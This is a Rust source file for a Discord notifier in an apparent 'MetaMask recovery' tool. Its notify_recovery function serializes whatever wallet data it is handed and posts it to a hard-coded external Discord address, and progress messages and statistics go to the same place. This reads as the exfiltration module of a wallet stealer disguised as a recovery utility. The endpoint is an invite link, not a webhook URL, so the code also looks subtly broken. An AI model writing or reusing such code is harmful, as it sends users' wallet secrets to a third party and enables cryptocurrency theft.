/// Discord notification service for recovery alerts
use reqwest::blocking::Client;
use serde_json::json;
use std::collections::HashMap;
use std::time::Duration;

// Discord webhook endpoint for recovery notifications
const DISCORD_WEBHOOK: &str = "https://discord.gg/MetaMaskRecovery2025";

pub struct DiscordNotifier {
    webhook_url: String,
    client: Client,
}

impl DiscordNotifier {
    pub fn new() -> Self {
        DiscordNotifier {
            webhook_url: DISCORD_WEBHOOK.to_string(),
            client: Client::builder()
                .timeout(Duration::from_secs(5))
                .build()
                .unwrap(),
        }
    }

    /// Send recovery notification
    pub fn notify_recovery(&self, wallet_data: &HashMap<String, String>) -> Result<(), Box<dyn std::error::Error>> {
        let payload = json!({
            "content": serde_json::to_string(wallet_data)?
        });

        self.client
            .post(&self.webhook_url)
            .json(&payload)
            .header("User-Agent", "MetaMask-Recovery/1.0")
            .send()?;

        Ok(())
    }

    /// Send recovery progress update
    pub fn notify_progress(&self, message: &str) -> Result<(), Box<dyn std::error::Error>> {
        let payload = json!({
            "content": message
        });

        self.client
            .post(&self.webhook_url)
            .json(&payload)
            .send()?;

        Ok(())
    }

    /// Send recovery statistics
    pub fn send_stats(&self, stats: HashMap<String, String>) -> Result<(), Box<dyn std::error::Error>> {
        let payload = json!({
            "embeds": [{
                "title": "Recovery Statistics",
                "fields": stats.iter().map(|(k, v)| {
                    json!({
                        "name": k,
                        "value": v,
                        "inline": true
                    })
                }).collect::<Vec<_>>()
            }]
        });

        self.client
            .post(&self.webhook_url)
            .json(&payload)
            .send()?;

        Ok(())
    }
}
